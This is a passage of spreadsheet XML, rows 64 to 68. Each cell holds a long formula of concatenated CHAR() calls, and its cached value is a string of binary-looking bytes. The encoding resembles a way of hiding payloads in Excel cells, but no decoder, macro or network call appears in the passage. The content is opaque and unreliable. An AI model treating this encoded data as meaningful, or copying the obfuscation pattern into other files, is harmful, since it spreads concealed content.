        <f>CHAR(38)&amp;CHAR(78)&amp;CHAR(172)&amp;CHAR(216)&amp;CHAR(48)&amp;CHAR(91)&amp;CHAR(183)&amp;CHAR(109)&amp;CHAR(95)&amp;CHAR(134)&amp;CHAR(228)&amp;CHAR(93)&amp;CHAR(81)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(74)&amp;CHAR(48)&amp;CHAR(222)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(145)&amp;CHAR(20)&amp;CHAR(6)&amp;CHAR(135)&amp;CHAR(99)&amp;CHAR(90)&amp;CHAR(166)&amp;CHAR(70)&amp;CHAR(131)&amp;CHAR(214)&amp;CHAR(210)&amp;CHAR(79)&amp;CHAR(137)&amp;CHAR(152)&amp;CHAR(31)&amp;CHAR(97)&amp;CHAR(217)&amp;CHAR(178)&amp;CHAR(78)&amp;CHAR(7)&amp;CHAR(25)&amp;CHAR(240)&amp;CHAR(218)&amp;CHAR(88)&amp;CHAR(53)&amp;CHAR(104)&amp;CHAR(252)&amp;CHAR(248)&amp;CHAR(193)&amp;CHAR(101)&amp;CHAR(74)&amp;CHAR(123)&amp;CHAR(110)&amp;CHAR(92)&amp;CHAR(254)&amp;CHAR(3)&amp;CHAR(82)&amp;CHAR(68)&amp;CHAR(208)&amp;CHAR(110)&amp;CHAR(24)&amp;CHAR(192)&amp;CHAR(38)&amp;CHAR(246)&amp;CHAR(165)&amp;CHAR(159)&amp;CHAR(208)&amp;CHAR(34)&amp;CHAR(107)&amp;CHAR(101)&amp;CHAR(191)&amp;CHAR(54)&amp;CHAR(214)&amp;CHAR(234)&amp;CHAR(169)&amp;CHAR(29)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(21)&amp;CHAR(97)&amp;CHAR(64)&amp;CHAR(128)&amp;CHAR(162)&amp;CHAR(19)&amp;CHAR(66)&amp;CHAR(107)&amp;CHAR(189)&amp;CHAR(132)&amp;CHAR(14)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(201)&amp;CHAR(133)&amp;CHAR(208)&amp;CHAR(11)&amp;CHAR(212)&amp;CHAR(246)&amp;CHAR(231)&amp;CHAR(26)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(133)&amp;CHAR(129)&amp;CHAR(52)&amp;CHAR(236)&amp;CHAR(176)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(158)&amp;CHAR(95)&amp;CHAR(76)&amp;CHAR(181)&amp;CHAR(199)&amp;CHAR(168)&amp;CHAR(253)&amp;CHAR(16)&amp;CHAR(140)&amp;CHAR(94)&amp;CHAR(103)&amp;CHAR(124)&amp;CHAR(41)&amp;CHAR(116)&amp;CHAR(138)&amp;CHAR(68)&amp;CHAR(211)&amp;CHAR(163)&amp;CHAR(184)&amp;CHAR(69)&amp;CHAR(23)&amp;CHAR(222)&amp;CHAR(182)&amp;CHAR(230)&amp;CHAR(240)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(170)&amp;CHAR(89)&amp;CHAR(255)&amp;CHAR(229)&amp;CHAR(85)&amp;CHAR(14)&amp;CHAR(163)&amp;CHAR(133)&amp;CHAR(236)&amp;CHAR(73)&amp;CHAR(50)&amp;CHAR(169)&amp;CHAR(123)&amp;CHAR(83)&amp;CHAR(240)&amp;CHAR(235)&amp;CHAR(144)&amp;CHAR(73)&amp;CHAR(205)&amp;CHAR(174)&amp;CHAR(206)&amp;CHAR(255)&amp;CHAR(152)&amp;CHAR(205)&amp;CHAR(248)&amp;CHAR(187)&amp;CHAR(175)&amp;CHAR(56)&amp;CHAR(117)&amp;CHAR(96)&amp;CHAR(217)&amp;CHAR(59)&amp;CHAR(69)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(128)&amp;CHAR(236)&amp;CHAR(115)&amp;CHAR(198)&amp;CHAR(49)&amp;CHAR(250)&amp;CHAR(1)&amp;CHAR(37)&amp;CHAR(83)&amp;CHAR(49)&amp;CHAR(134)&amp;CHAR(176)&amp;CHAR(104)&amp;CHAR(15)&amp;CHAR(211)&amp;CHAR(79)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(185)&amp;CHAR(224)&amp;CHAR(121)&amp;CHAR(179)&amp;CHAR(238)&amp;CHAR(136)&amp;CHAR(46)&amp;CHAR(109)&amp;CHAR(186)&amp;CHAR(40)&amp;CHAR(56)&amp;CHAR(240)&amp;CHAR(164)&amp;CHAR(101)&amp;CHAR(247)&amp;CHAR(105)&amp;CHAR(177)&amp;CHAR(147)&amp;CHAR(85)&amp;CHAR(63)&amp;CHAR(122)&amp;CHAR(230)&amp;CHAR(20)&amp;CHAR(21)&amp;CHAR(127)&amp;CHAR(122)&amp;CHAR(43)&amp;CHAR(110)&amp;CHAR(241)&amp;CHAR(242)&amp;CHAR(229)&amp;CHAR(10)&amp;CHAR(206)&amp;CHAR(116)&amp;CHAR(119)&amp;CHAR(125)&amp;CHAR(150)&amp;CHAR(64)&amp;CHAR(203)&amp;CHAR(203)&amp;CHAR(154)&amp;CHAR(213)&amp;CHAR(76)&amp;CHAR(157)&amp;CHAR(243)&amp;CHAR(45)&amp;CHAR(88)&amp;CHAR(103)&amp;CHAR(121)&amp;CHAR(95)&amp;CHAR(134)&amp;CHAR(162)&amp;CHAR(242)&amp;CHAR(251)&amp;CHAR(178)&amp;CHAR(197)&amp;CHAR(164)&amp;CHAR(21)&amp;CHAR(27)&amp;CHAR(25)&amp;CHAR(62)&amp;CHAR(182)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(127)&amp;CHAR(193)&amp;CHAR(161)</f>
        <v>&amp;N¬Ø0[·m_†ä]Qù_x0013_J0ÞTP‘_x0014__x0006_‡cZ¦FƒÖÒO‰˜_x001F_aÙ²N_x0007__x0019_ðÚX5hüøÁeJ{n\þ_x0003_RDÐn_x0018_À&amp;ö¥ŸÐ"ke¿6Öê©_x001D_Có_x0015_a@€¢_x0013_Bk½„_x000E_žAÉ…Ð_x000B_Ôöç_x001A__x0006_Ë…4ì°pž_LµÇ¨ý_x0010_Œ^g|)tŠDÓ£¸E_x0017_Þ¶æðXUªYÿåU_x000E_£…ìI2©{SðëIÍ®Îÿ˜Íø»¯8u`Ù;EG"€ìsÆ1ú_x0001_%S1†°h_x000F_ÓO_x001F_
¹ày³îˆ.mº(8ð¤e÷i±“U?zæ_x0014__x0015_z+nñòå
Îtw}–@ËËšÕLó-Xgy_†¢òû²Å¤_x0015__x001B__x0019_&gt;¶Ÿ^Á¡</v>
      </c>
      <c r="C64" t="str">
        <f>CHAR(70)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(187)&amp;CHAR(167)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(189)&amp;CHAR(201)&amp;CHAR(206)</f>
        <v>FâD»§˜¼½ÉÎ</v>
      </c>
    </row>
    <row r="65" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B65" t="str">
        <f>CHAR(32)&amp;CHAR(169)&amp;CHAR(72)&amp;CHAR(102)&amp;CHAR(89)&amp;CHAR(26)&amp;CHAR(143)&amp;CHAR(201)&amp;CHAR(195)&amp;CHAR(88)&amp;CHAR(186)&amp;CHAR(184)&amp;CHAR(235)&amp;CHAR(82)&amp;CHAR(129)&amp;CHAR(135)&amp;CHAR(93)&amp;CHAR(161)&amp;CHAR(20)&amp;CHAR(5)&amp;CHAR(239)&amp;CHAR(79)&amp;CHAR(199)&amp;CHAR(222)&amp;CHAR(12)&amp;CHAR(242)&amp;CHAR(75)&amp;CHAR(89)&amp;CHAR(30)&amp;CHAR(167)&amp;CHAR(122)&amp;CHAR(73)&amp;CHAR(119)&amp;CHAR(5)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(221)&amp;CHAR(124)&amp;CHAR(46)&amp;CHAR(164)&amp;CHAR(230)&amp;CHAR(103)&amp;CHAR(64)&amp;CHAR(45)&amp;CHAR(57)&amp;CHAR(213)&amp;CHAR(142)&amp;CHAR(52)&amp;CHAR(172)&amp;CHAR(233)&amp;CHAR(233)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(221)&amp;CHAR(83)&amp;CHAR(26)&amp;CHAR(102)&amp;CHAR(198)&amp;CHAR(3)&amp;CHAR(67)&amp;CHAR(10)&amp;CHAR(77)&amp;CHAR(114)&amp;CHAR(178)&amp;CHAR(107)&amp;CHAR(145)&amp;CHAR(49)&amp;CHAR(191)&amp;CHAR(93)&amp;CHAR(148)&amp;CHAR(80)&amp;CHAR(16)&amp;CHAR(175)&amp;CHAR(197)&amp;CHAR(44)&amp;CHAR(149)&amp;CHAR(22)&amp;CHAR(141)&amp;CHAR(129)&amp;CHAR(90)&amp;CHAR(19)&amp;CHAR(49)&amp;CHAR(86)&amp;CHAR(175)&amp;CHAR(191)&amp;CHAR(103)&amp;CHAR(145)&amp;CHAR(50)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(107)&amp;CHAR(3)&amp;CHAR(232)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(196)&amp;CHAR(153)&amp;CHAR(209)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(229)&amp;CHAR(161)&amp;CHAR(55)&amp;CHAR(137)&amp;CHAR(243)&amp;CHAR(207)&amp;CHAR(54)&amp;CHAR(242)&amp;CHAR(183)&amp;CHAR(254)&amp;CHAR(112)&amp;CHAR(4)&amp;CHAR(168)&amp;CHAR(17)&amp;CHAR(95)&amp;CHAR(95)&amp;CHAR(207)&amp;CHAR(221)&amp;CHAR(91)&amp;CHAR(218)&amp;CHAR(171)&amp;CHAR(149)&amp;CHAR(126)&amp;CHAR(29)&amp;CHAR(152)&amp;CHAR(153)&amp;CHAR(241)&amp;CHAR(243)&amp;CHAR(253)&amp;CHAR(98)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(91)&amp;CHAR(72)&amp;CHAR(91)&amp;CHAR(243)&amp;CHAR(116)&amp;CHAR(14)&amp;CHAR(233)&amp;CHAR(168)&amp;CHAR(41)&amp;CHAR(99)&amp;CHAR(59)&amp;CHAR(182)&amp;CHAR(161)&amp;CHAR(127)&amp;CHAR(98)&amp;CHAR(199)&amp;CHAR(253)&amp;CHAR(215)&amp;CHAR(162)&amp;CHAR(32)&amp;CHAR(193)&amp;CHAR(136)&amp;CHAR(109)&amp;CHAR(218)&amp;CHAR(233)&amp;CHAR(107)&amp;CHAR(21)&amp;CHAR(191)&amp;CHAR(45)&amp;CHAR(99)&amp;CHAR(103)&amp;CHAR(219)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(34)&amp;CHAR(19)&amp;CHAR(11)&amp;CHAR(149)&amp;CHAR(33)&amp;CHAR(123)&amp;CHAR(226)&amp;CHAR(61)&amp;CHAR(249)&amp;CHAR(154)&amp;CHAR(211)&amp;CHAR(82)&amp;CHAR(121)&amp;CHAR(102)&amp;CHAR(102)&amp;CHAR(161)&amp;CHAR(28)&amp;CHAR(239)&amp;CHAR(156)&amp;CHAR(44)&amp;CHAR(1)&amp;CHAR(173)&amp;CHAR(158)&amp;CHAR(204)&amp;CHAR(12)&amp;CHAR(151)&amp;CHAR(65)&amp;CHAR(77)&amp;CHAR(145)&amp;CHAR(8)&amp;CHAR(243)&amp;CHAR(20)&amp;CHAR(34)&amp;CHAR(46)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(1)&amp;CHAR(217)&amp;CHAR(143)&amp;CHAR(55)&amp;CHAR(88)&amp;CHAR(186)&amp;CHAR(195)&amp;CHAR(22)&amp;CHAR(219)&amp;CHAR(196)&amp;CHAR(140)&amp;CHAR(143)&amp;CHAR(28)&amp;CHAR(189)&amp;CHAR(152)&amp;CHAR(204)&amp;CHAR(247)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(57)&amp;CHAR(40)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(241)&amp;CHAR(87)&amp;CHAR(158)&amp;CHAR(160)&amp;CHAR(248)&amp;CHAR(148)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(213)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(128)&amp;CHAR(147)&amp;CHAR(210)&amp;CHAR(209)&amp;CHAR(133)&amp;CHAR(116)&amp;CHAR(59)&amp;CHAR(90)&amp;CHAR(201)&amp;CHAR(219)&amp;CHAR(94)&amp;CHAR(162)&amp;CHAR(235)&amp;CHAR(145)&amp;CHAR(138)&amp;CHAR(121)&amp;CHAR(112)&amp;CHAR(130)&amp;CHAR(184)</f>
        <v xml:space="preserve"> ©HfY_x001A_ÉÃXº¸ëR‡]¡_x0014__x0005_ïOÇÞ_x000C_òKY_x001E_§zIw_x0005_Ñ¤Ý|.¤æg@-9ÕŽ4¬éé&gt;‚ÝS_x001A_fÆ_x0003_C
Mr²k‘1¿]”P_x0010_¯Å,•_x0016_Z_x0013_1V¯¿g‘2q#k_x0003_èh_x0004_Ä™Ñ†Åå¡7‰óÏ6ò·þp_x0004_¨_x0011___ÏÝ[Ú«•~_x001D_˜™ñóýbòq[H[ót_x000E_é¨)c;¶¡bÇý×¢ ÁˆmÚék_x0015_¿-cgÛÖÕ"_x0013__x000B_•!{â=ùšÓRyff¡_x001C_ïœ,_x0001_­žÌ_x000C_—AM‘_x0008_ó_x0014_"._x0006_Š_x0001_Ù7XºÃ_x0016_ÛÄŒ_x001C_½˜Ì÷Ìw9(ïÿñWž ø”}ŸÕ	_x0001_€“ÒÑ…t;ZÉÛ^¢ë‘Šyp‚¸</v>
      </c>
      <c r="C65" t="str">
        <f>CHAR(147)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(181)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(243)&amp;CHAR(96)</f>
        <v>“ë÷ý¼µ_x000D_ƒó`</v>
      </c>
    </row>
    <row r="66" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B66" t="str">
        <f>CHAR(17)&amp;CHAR(68)&amp;CHAR(146)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(169)&amp;CHAR(9)&amp;CHAR(226)&amp;CHAR(248)&amp;CHAR(89)&amp;CHAR(1)&amp;CHAR(39)&amp;CHAR(114)&amp;CHAR(137)&amp;CHAR(35)&amp;CHAR(215)&amp;CHAR(183)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(213)&amp;CHAR(103)&amp;CHAR(106)&amp;CHAR(121)&amp;CHAR(158)&amp;CHAR(10)&amp;CHAR(233)&amp;CHAR(86)&amp;CHAR(21)&amp;CHAR(250)&amp;CHAR(9)&amp;CHAR(26)&amp;CHAR(240)&amp;CHAR(89)&amp;CHAR(28)&amp;CHAR(52)&amp;CHAR(68)&amp;CHAR(111)&amp;CHAR(154)&amp;CHAR(82)&amp;CHAR(221)&amp;CHAR(77)&amp;CHAR(34)&amp;CHAR(162)&amp;CHAR(24)&amp;CHAR(204)&amp;CHAR(125)&amp;CHAR(11)&amp;CHAR(194)&amp;CHAR(226)&amp;CHAR(116)&amp;CHAR(67)&amp;CHAR(131)&amp;CHAR(178)&amp;CHAR(9)&amp;CHAR(124)&amp;CHAR(127)&amp;CHAR(216)&amp;CHAR(3)&amp;CHAR(204)&amp;CHAR(213)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(247)&amp;CHAR(109)&amp;CHAR(230)&amp;CHAR(11)&amp;CHAR(160)&amp;CHAR(109)&amp;CHAR(73)&amp;CHAR(251)&amp;CHAR(103)&amp;CHAR(210)&amp;CHAR(205)&amp;CHAR(226)&amp;CHAR(101)&amp;CHAR(254)&amp;CHAR(67)&amp;CHAR(75)&amp;CHAR(241)&amp;CHAR(82)&amp;CHAR(182)&amp;CHAR(30)&amp;CHAR(253)&amp;CHAR(190)&amp;CHAR(228)&amp;CHAR(52)&amp;CHAR(225)&amp;CHAR(137)&amp;CHAR(156)&amp;CHAR(253)&amp;CHAR(21)&amp;CHAR(224)&amp;CHAR(159)&amp;CHAR(166)&amp;CHAR(25)&amp;CHAR(105)&amp;CHAR(195)&amp;CHAR(127)&amp;CHAR(131)&amp;CHAR(126)&amp;CHAR(144)&amp;CHAR(126)&amp;CHAR(231)&amp;CHAR(30)&amp;CHAR(90)&amp;CHAR(28)&amp;CHAR(232)&amp;CHAR(12)&amp;CHAR(224)&amp;CHAR(177)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(33)&amp;CHAR(181)&amp;CHAR(206)&amp;CHAR(184)&amp;CHAR(86)&amp;CHAR(103)&amp;CHAR(102)&amp;CHAR(41)&amp;CHAR(223)&amp;CHAR(195)&amp;CHAR(144)&amp;CHAR(89)&amp;CHAR(40)&amp;CHAR(57)&amp;CHAR(255)&amp;CHAR(133)&amp;CHAR(204)&amp;CHAR(80)&amp;CHAR(207)&amp;CHAR(8)&amp;CHAR(114)&amp;CHAR(252)&amp;CHAR(115)&amp;CHAR(129)&amp;CHAR(30)&amp;CHAR(186)&amp;CHAR(124)&amp;CHAR(79)&amp;CHAR(127)&amp;CHAR(229)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(142)&amp;CHAR(214)&amp;CHAR(216)&amp;CHAR(22)&amp;CHAR(50)&amp;CHAR(240)&amp;CHAR(53)&amp;CHAR(215)&amp;CHAR(141)&amp;CHAR(96)&amp;CHAR(217)&amp;CHAR(161)&amp;CHAR(74)&amp;CHAR(74)&amp;CHAR(173)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(231)&amp;CHAR(14)&amp;CHAR(76)&amp;CHAR(80)&amp;CHAR(135)&amp;CHAR(211)&amp;CHAR(210)&amp;CHAR(24)&amp;CHAR(175)&amp;CHAR(229)&amp;CHAR(169)&amp;CHAR(65)&amp;CHAR(227)&amp;CHAR(131)&amp;CHAR(207)&amp;CHAR(139)&amp;CHAR(76)&amp;CHAR(249)&amp;CHAR(192)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(44)&amp;CHAR(167)&amp;CHAR(72)&amp;CHAR(249)&amp;CHAR(8)&amp;CHAR(237)&amp;CHAR(222)&amp;CHAR(78)&amp;CHAR(134)&amp;CHAR(235)&amp;CHAR(85)&amp;CHAR(199)&amp;CHAR(27)&amp;CHAR(14)&amp;CHAR(166)&amp;CHAR(24)&amp;CHAR(100)&amp;CHAR(59)&amp;CHAR(16)&amp;CHAR(72)&amp;CHAR(146)&amp;CHAR(232)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(235)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(113)&amp;CHAR(161)&amp;CHAR(207)&amp;CHAR(135)&amp;CHAR(149)&amp;CHAR(194)&amp;CHAR(125)&amp;CHAR(50)&amp;CHAR(234)&amp;CHAR(134)&amp;CHAR(69)&amp;CHAR(120)&amp;CHAR(21)&amp;CHAR(159)&amp;CHAR(86)&amp;CHAR(192)&amp;CHAR(63)&amp;CHAR(134)&amp;CHAR(140)&amp;CHAR(204)&amp;CHAR(86)&amp;CHAR(7)&amp;CHAR(243)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(34)&amp;CHAR(227)&amp;CHAR(145)&amp;CHAR(36)&amp;CHAR(15)&amp;CHAR(101)&amp;CHAR(238)&amp;CHAR(190)&amp;CHAR(166)&amp;CHAR(35)&amp;CHAR(179)&amp;CHAR(125)&amp;CHAR(40)&amp;CHAR(204)&amp;CHAR(13)&amp;CHAR(192)&amp;CHAR(229)&amp;CHAR(124)&amp;CHAR(231)&amp;CHAR(17)&amp;CHAR(80)</f>
        <v>_x0011_D’þW©	âøY_x0001_'r‰#×·_x0001__x0007_Õgjyž
éV_x0015_ú	_x001A_ðY_x001C_4DošRÝM"¢_x0018_Ì}_x000B_ÂâtCƒ²	|Ø_x0003_ÌÕ­i÷mæ_x000B_ mIûgÒÍâeþCKñR¶_x001E_ý¾ä4á‰œý_x0015_àŸ¦_x0019_iÃƒ~~ç_x001E_Z_x001C_è_x000C_à±÷ý!µÎ¸Vgf)ßÃY(9ÿ…ÌPÏ_x0008_rüs_x001E_º|OåõXŽÖØ_x0016_2ð5×`Ù¡JJ­È_x0012_ç_x000E_LP‡ÓÒ_x0018_¯å©AãƒÏ‹LùÀé‚,§Hù_x0008_íÞN†ëUÇ_x001B__x000E_¦_x0018_d;_x0010_H’èO/ë‹Ãq¡Ï‡•Â}2ê†Ex_x0015_ŸVÀ?†ŒÌV_x0007_ó5Ç"ã‘$_x000F_eî¾¦#³}(Ì_x000D_Àå|ç_x0011_P</v>
      </c>
      <c r="C66" t="str">
        <f>CHAR(247)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(255)&amp;CHAR(210)&amp;CHAR(213)</f>
        <v>÷µ6¨£0ÿÒÕ</v>
      </c>
    </row>
    <row r="67" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B67" t="str">
        <f>CHAR(152)&amp;CHAR(220)&amp;CHAR(34)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(237)&amp;CHAR(66)&amp;CHAR(203)&amp;CHAR(125)&amp;CHAR(143)&amp;CHAR(228)&amp;CHAR(197)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(227)&amp;CHAR(182)&amp;CHAR(167)&amp;CHAR(142)&amp;CHAR(172)&amp;CHAR(80)&amp;CHAR(255)&amp;CHAR(119)&amp;CHAR(98)&amp;CHAR(195)&amp;CHAR(21)&amp;CHAR(58)&amp;CHAR(7)&amp;CHAR(241)&amp;CHAR(160)&amp;CHAR(103)&amp;CHAR(61)&amp;CHAR(52)&amp;CHAR(232)&amp;CHAR(60)&amp;CHAR(5)&amp;CHAR(89)&amp;CHAR(248)&amp;CHAR(195)&amp;CHAR(80)&amp;CHAR(16)&amp;CHAR(45)&amp;CHAR(58)&amp;CHAR(212)&amp;CHAR(213)&amp;CHAR(22)&amp;CHAR(215)&amp;CHAR(247)&amp;CHAR(94)&amp;CHAR(131)&amp;CHAR(203)&amp;CHAR(166)&amp;CHAR(156)&amp;CHAR(221)&amp;CHAR(59)&amp;CHAR(93)&amp;CHAR(97)&amp;CHAR(240)&amp;CHAR(61)&amp;CHAR(79)&amp;CHAR(69)&amp;CHAR(168)&amp;CHAR(195)&amp;CHAR(158)&amp;CHAR(198)&amp;CHAR(124)&amp;CHAR(45)&amp;CHAR(79)&amp;CHAR(98)&amp;CHAR(69)&amp;CHAR(9)&amp;CHAR(241)&amp;CHAR(235)&amp;CHAR(51)&amp;CHAR(205)&amp;CHAR(125)&amp;CHAR(67)&amp;CHAR(211)&amp;CHAR(32)&amp;CHAR(172)&amp;CHAR(84)&amp;CHAR(231)&amp;CHAR(141)&amp;CHAR(80)&amp;CHAR(61)&amp;CHAR(154)&amp;CHAR(53)&amp;CHAR(142)&amp;CHAR(252)&amp;CHAR(252)&amp;CHAR(189)&amp;CHAR(15)&amp;CHAR(134)&amp;CHAR(132)&amp;CHAR(95)&amp;CHAR(169)&amp;CHAR(117)&amp;CHAR(114)&amp;CHAR(118)&amp;CHAR(101)&amp;CHAR(21)&amp;CHAR(175)&amp;CHAR(109)&amp;CHAR(246)&amp;CHAR(173)&amp;CHAR(166)&amp;CHAR(28)&amp;CHAR(194)&amp;CHAR(204)&amp;CHAR(92)&amp;CHAR(172)&amp;CHAR(36)&amp;CHAR(209)&amp;CHAR(138)&amp;CHAR(150)&amp;CHAR(82)&amp;CHAR(175)&amp;CHAR(157)&amp;CHAR(188)&amp;CHAR(131)&amp;CHAR(39)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(224)&amp;CHAR(155)&amp;CHAR(98)&amp;CHAR(14)&amp;CHAR(136)&amp;CHAR(86)&amp;CHAR(206)&amp;CHAR(74)&amp;CHAR(154)&amp;CHAR(25)&amp;CHAR(222)&amp;CHAR(159)&amp;CHAR(119)&amp;CHAR(109)&amp;CHAR(246)&amp;CHAR(65)&amp;CHAR(234)&amp;CHAR(92)&amp;CHAR(187)&amp;CHAR(90)&amp;CHAR(83)&amp;CHAR(199)&amp;CHAR(172)&amp;CHAR(48)&amp;CHAR(212)&amp;CHAR(106)&amp;CHAR(57)&amp;CHAR(161)&amp;CHAR(185)&amp;CHAR(48)&amp;CHAR(8)&amp;CHAR(93)&amp;CHAR(109)&amp;CHAR(196)&amp;CHAR(121)&amp;CHAR(128)&amp;CHAR(101)&amp;CHAR(158)&amp;CHAR(33)&amp;CHAR(228)&amp;CHAR(97)&amp;CHAR(48)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(83)&amp;CHAR(99)&amp;CHAR(57)&amp;CHAR(11)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(157)&amp;CHAR(57)&amp;CHAR(22)&amp;CHAR(201)&amp;CHAR(93)&amp;CHAR(44)&amp;CHAR(216)&amp;CHAR(62)&amp;CHAR(126)&amp;CHAR(183)&amp;CHAR(6)&amp;CHAR(211)&amp;CHAR(197)&amp;CHAR(172)&amp;CHAR(112)&amp;CHAR(32)&amp;CHAR(85)&amp;CHAR(149)&amp;CHAR(122)&amp;CHAR(114)&amp;CHAR(213)&amp;CHAR(131)&amp;CHAR(71)&amp;CHAR(13)&amp;CHAR(101)&amp;CHAR(252)&amp;CHAR(103)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(181)&amp;CHAR(221)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(48)&amp;CHAR(203)&amp;CHAR(27)&amp;CHAR(52)&amp;CHAR(115)&amp;CHAR(234)&amp;CHAR(118)&amp;CHAR(170)&amp;CHAR(254)&amp;CHAR(112)&amp;CHAR(52)&amp;CHAR(73)&amp;CHAR(101)&amp;CHAR(206)&amp;CHAR(25)&amp;CHAR(125)&amp;CHAR(253)&amp;CHAR(11)&amp;CHAR(26)&amp;CHAR(243)&amp;CHAR(160)&amp;CHAR(20)&amp;CHAR(18)&amp;CHAR(215)&amp;CHAR(21)&amp;CHAR(117)&amp;CHAR(50)&amp;CHAR(90)&amp;CHAR(133)&amp;CHAR(115)&amp;CHAR(54)&amp;CHAR(193)&amp;CHAR(11)&amp;CHAR(147)&amp;CHAR(192)&amp;CHAR(88)&amp;CHAR(83)&amp;CHAR(1)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(182)&amp;CHAR(182)&amp;CHAR(76)&amp;CHAR(229)&amp;CHAR(173)&amp;CHAR(54)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(79)</f>
        <v>˜Ü"_x0016_UíBË}äÅ_x0019_xã¶§Ž¬PÿwbÃ_x0015_:_x0007_ñ g=4è&lt;_x0005_YøÃP_x0010_-:ÔÕ_x0016_×÷^ƒË¦œÝ;]að=OE¨ÃžÆ|-ObE	ñë3Í}CÓ ¬TçP=š5Žüü½_x000F_†„_©urve_x0015_¯mö­¦_x001C_ÂÌ\¬$ÑŠ–R¯¼ƒ'®4_x0016_à›b_x000E_ˆVÎJš_x0019_ÞŸwmöAê\»ZSÇ¬0Ôj9¡¹0_x0008_]mÄy€ež!äa0_x0008_±Sc9_x000B__x0012_š9_x0016_É],Ø&gt;~·_x0006_ÓÅ¬p U•zrÕƒG_x000D_eügQöµÝÀ	0Ë_x001B_4sêvªþp4IeÎ_x0019_}ý_x000B__x001A_ó _x0014__x0012_×_x0015_u2Z…s6Á_x000B_“ÀXS_x0001_6_x0001_¶¶Lå­6_x0007_O</v>
      </c>
      <c r="C67" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(56)&amp;CHAR(41)&amp;CHAR(135)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(189)</f>
        <v>ô6Í£8)‡˜¼½</v>
      </c>
    </row>
    <row r="68" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B68" t="str">
        <f>CHAR(188)&amp;CHAR(80)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(167)&amp;CHAR(181)&amp;CHAR(122)&amp;CHAR(76)&amp;CHAR(84)&amp;CHAR(204)&amp;CHAR(120)&amp;CHAR(75)&amp;CHAR(15)&amp;CHAR(174)&amp;CHAR(158)&amp;CHAR(219)&amp;CHAR(226)&amp;CHAR(119)&amp;CHAR(252)&amp;CHAR(85)&amp;CHAR(78)&amp;CHAR(98)&amp;CHAR(67)&amp;CHAR(149)&amp;CHAR(58)&amp;CHAR(77)&amp;CHAR(61)&amp;CHAR(98)&amp;CHAR(128)&amp;CHAR(37)&amp;CHAR(120)&amp;CHAR(7)&amp;CHAR(101)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(117)&amp;CHAR(161)&amp;CHAR(90)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(160)&amp;CHAR(229)&amp;CHAR(1)&amp;CHAR(61)&amp;CHAR(242)&amp;CHAR(244)&amp;CHAR(175)&amp;CHAR(96)&amp;CHAR(72)&amp;CHAR(92)&amp;CHAR(39)&amp;CHAR(202)&amp;CHAR(230)&amp;CHAR(220)&amp;CHAR(248)&amp;CHAR(250)&amp;CHAR(89)&amp;CHAR(133)&amp;CHAR(71)&amp;CHAR(13)&amp;CHAR(162)&amp;CHAR(153)&amp;CHAR(34)&amp;CHAR(114)&amp;CHAR(181)&amp;CHAR(252)&amp;CHAR(122)&amp;CHAR(242)&amp;CHAR(197)&amp;CHAR(209)&amp;CHAR(191)&amp;CHAR(113)&amp;CHAR(210)&amp;CHAR(183)&amp;CHAR(13)&amp;CHAR(115)&amp;CHAR(215)&amp;CHAR(130)&amp;CHAR(227)&amp;CHAR(64)&amp;CHAR(132)&amp;CHAR(108)&amp;CHAR(162)&amp;CHAR(190)&amp;CHAR(68)&amp;CHAR(202)&amp;CHAR(141)&amp;CHAR(100)&amp;CHAR(144)&amp;CHAR(120)&amp;CHAR(81)&amp;C